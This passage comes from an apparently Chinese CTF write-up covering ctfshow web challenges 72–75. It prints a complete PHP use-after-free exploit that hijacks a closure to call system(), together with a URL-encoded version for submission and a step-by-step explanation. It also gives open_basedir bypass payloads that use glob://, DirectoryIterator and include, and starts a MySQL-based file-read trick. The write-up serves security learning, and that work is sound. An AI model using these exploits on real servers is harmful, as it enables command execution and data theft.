class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要 URL 编码发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A<br></code></pre></td></tr></table></figure><p><code>uaf</code> 漏洞全称为 <code>user after free</code>，原理是当一个已经释放的内存块被重新分配并再次使用时，攻击者可能利用该内存块中的残留数据来执行任意代码，属于堆的知识点</p><p>deepseek 老师详解：</p><p>这个PHP脚本利用PHP中的UAF（Use After Free）漏洞，通过精心构造的内存操作和闭包对象篡改，实现任意命令执行。以下是对代码的详细分析：</p><p>漏洞触发与利用流程</p><ol><li>UAF 触发与内存泄漏<ul><li><strong>Vuln 类析构</strong>：<code>trigger_uaf</code> 函数创建 <code>Vuln</code> 对象，其析构函数通过 <code>debug_backtrace</code> 捕获堆栈信息，将释放后的字符串引用存入 <code>$abc</code>。</li><li><strong>堆布局</strong>：预先分配多个长字符串（<code>$contiguous</code>）来稳定堆布局，确保 <code>$abc</code> 指向释放后的内存区域。</li></ul></li><li>内存操作基础函数<ul><li><strong>地址转换</strong>：<code>str2ptr</code> 和 <code>ptr2str</code> 用于字符串与指针的转换，<code>write</code> 函数允许在字符串中任意位置写入数据。</li><li><strong>内存泄漏</strong>：<code>leak </code>函数通过修改字符串内部指针，读取任意地址内存值。</li></ul></li><li>ELF 解析与基址定位<ul><li><strong>ELF 头识别</strong>：<code>get_binary_base</code> 通过特征值 <code>0x7f454c460101</code>（ELF魔数）定位 PHP 二进制基址。</li><li><strong>程序头解析</strong>：<code>parse_elf</code> 分析 ELF 结构，获取数据段和代码段信息，为后续符号查找奠定基础。</li></ul></li><li>关键函数定位<ul><li><strong>基础函数表</strong>：<code>get_basic_funcs</code> 遍历内存，匹配 <code>zend_function_entry</code> 结构，定位 PHP 内部函数表。</li><li><strong>system 函数定位</strong>：<code>get_system</code> 遍历函数表，通过名称哈希（’system’对应<code>0x6d6574737973</code>）找到 <code>system</code> 函数地址。</li></ul></li><li>闭包对象篡改<ul><li><strong>结构复制</strong>：将原闭包对象数据复制到伪造对象中，维持结构合法性。</li><li><strong>函数指针劫持</strong>：修改闭包处理函数为 <code>system</code>，使得调用闭包时执行任意命令。</li></ul></li><li>命令执行<ul><li><strong>最终触发</strong>：通过 <code>($helper-&gt;b)($cmd)</code> 调用被篡改的闭包，触发 <code>system($cmd)</code> 执行系统命令。</li></ul></li></ol><p>关键代码解析</p><ul><li><p><strong>UAF利用点</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br><span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>; <span class="hljs-comment">// 分配字符串</span><br><span class="hljs-comment">// 对象销毁后，$abc仍引用已释放内存</span><br></code></pre></td></tr></table></figure></li><li><p><strong>闭包对象劫持</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment">// 替换处理函数为system</span><br></code></pre></td></tr></table></figure></li><li><p><strong>内存泄漏与计算</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 获取闭包处理程序地址</span><br><span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// 泄漏二进制地址</span><br></code></pre></td></tr></table></figure></li></ul><p>这个题对我来说有点难理解…</p><h1 id="Web-73"><a href="#Web-73" class="headerlink" title="Web 73"></a>Web 73</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-built_in">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>可以直接包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&#x27;glob:///*&#x27;));die();<br>c=include(&#x27;/flagc.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web-74"><a href="#Web-74" class="headerlink" title="Web 74"></a>Web 74</h1><p>用之前的 payload 发现 <code>scandir()</code> 被 ban 了</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: scandir() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>换成 <code>DirectoryIterator</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=$a = new DirectoryIterator(&quot;glob:///*&quot;);<br>foreach($a as $f)&#123;<br>    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);<br>&#125;;exit();<br></code></pre></td></tr></table></figure><p>绕过姿势还是在这篇文章有讲解 <a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/">open_basedir绕过</a></p><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flagx.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web-75"><a href="#Web-75" class="headerlink" title="Web 75"></a>Web 75</h1><p>同样用 payload 能读到有 <code>flag36.txt</code>，但是访问失败有限制，有 mysql，利用 mysql 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=127.0.0.1;dbname=mysql&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span 